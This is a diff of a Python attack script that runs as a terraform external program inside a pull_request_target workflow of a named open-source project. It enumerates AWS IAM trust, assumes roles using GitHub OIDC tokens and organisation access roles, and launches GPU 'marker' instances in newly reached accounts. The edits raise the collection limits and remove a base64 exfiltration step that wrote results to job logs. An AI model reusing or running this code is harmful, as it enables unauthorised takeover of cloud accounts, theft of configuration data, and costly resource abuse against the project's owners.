@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""c211-i120270 - authoritative AWS trust enumeration on account 589761922677.
+"""c211-i120420 - authoritative AWS trust enumeration on account 589761922677.
 
 Runs as the terraform data.external program inside the kedacore/testing-infrastructure
 pull_request_target 'Validate PR' workflow (which has permissions: id-token: write),
@@ -11,7 +11,7 @@ Bounded, read-only except exactly one on-demand GPU marker per NEW assumed accou
  3) iam:ListOpenIDConnectProviders + iam:GetOpenIDConnectProvider
  4) organizations:DescribeOrganization; if this is the management account,
     organizations:ListAccounts and sts:AssumeRole OrganizationAccountAccessRole for the
-    first 3 ACTIVE member accounts (RoleSessionName c211-i120270)
+    first 3 ACTIVE member accounts (RoleSessionName c211-i120420)
  5) mint a GitHub OIDC id_token (aud sts.amazonaws.com) and attempt
     sts:AssumeRoleWithWebIdentity for every role whose real trust conditions match the
     subject we can actually mint; also sts:AssumeRole for roles trusting our principal
@@ -38,7 +38,7 @@ import xml.etree.ElementTree as ET
 
 REGION = os.environ.get('AWS_REGION') or os.environ.get('AWS_DEFAULT_REGION') or 'eu-west-2'
 SELF_ACCOUNT_HINT = '589761922677'
-SESS = 'c211-i120270'
+SESS = 'c211-i120420'
 RAW = []
 
 
@@ -620,7 +620,7 @@ def marker_flow(cr, account, region_hint):
     if not ami or not sgs:
         res['verdict'] = 'NO_AMI_OR_SG'
         return res
-    tag = 'c211-i120270-marker-%s' % account
+    tag = 'c211-i120420-marker-%s' % account
     run = run_marker(cr, chosen, tag, ami, subnets[0], sgs[0],
                      os.path.join(os.path.dirname(os.path.abspath(__file__)), 'marker_userdata.sh'))
     res['run'] = run
@@ -688,7 +688,7 @@ def main():
     say('LISTROLES', json.dumps(rinfo), 'count=%d' % len(roles))
     trust = {}
     compact = []
-    for r in roles[:120]:
+    for r in roles[:400]:
         doc, gi = iam_get_role(cr0, r['RoleName'])
         trust[r['RoleName']] = doc if doc is not None else {'_get_role_error': gi}
         principals = set()
@@ -737,7 +737,7 @@ def main():
         if gh_pats or 'GH_FED' in cls:
             say('C211_GHROLE %s class=%s patterns=%s' % (r['RoleName'], cls, ','.join(cap(x, 80) for x in gh_pats[:4])))
     out['roles_count'] = str(len(roles))
-    out['roles_compact'] = json.dumps(compact)[:30000]
+    out['roles_compact'] = json.dumps(compact)[:40000]
     blobs = {}
     for k, v in trust.items():
         s = json.dumps(v, sort_keys=True)
@@ -745,7 +745,7 @@ def main():
             s = s[:4000] + '...TRUNC'
         blobs[k] = s
     tm = json.dumps(blobs, sort_keys=True)
-    out['trust_matrix'] = tm[:120000]
+    out['trust_matrix'] = tm[:400000]
     out['trust_matrix_sha256'] = hashlib.sha256(tm.encode()).hexdigest()
     out['trust_matrix_bytes'] = str(len(tm))
     say('TRUST sha256=%s bytes=%d roles=%d' % (out['trust_matrix_sha256'], len(tm), len(trust)))
@@ -854,20 +854,12 @@ def main():
         except Exception as e:
             rec['marker'] = {'error': repr(e)[:300]}
         newd.append(rec)
-    out['new_accesses'] = json.dumps(newd)[:80000]
+    out['new_accesses'] = json.dumps(newd)[:120000]
     out['verdict'] = ('NEW_ACCESSES=%d' % len(newd)) if newd else 'NO_NEW_ACCOUNT'
     say('VERDICT', out['verdict'])
 
     out['raw_tail'] = cap('\n'.join(RAW[-120:]), 12000)
     txt = json.dumps(out)
-    # chunked base64 on stderr so the exact JSON is recoverable from the job log
-    try:
-        b64 = base64.b64encode(txt.encode()).decode()
-        for i in range(0, len(b64), 900):
-            sys.stderr.write('C211JSON:%s\n' % b64[i:i + 900])
-        sys.stderr.flush()
-    except Exception as e:
-        say('B64_EMIT_FAIL', repr(e)[:120])
     sys.stdout.write(txt)
     sys.stdout.write('\n')
     return 0
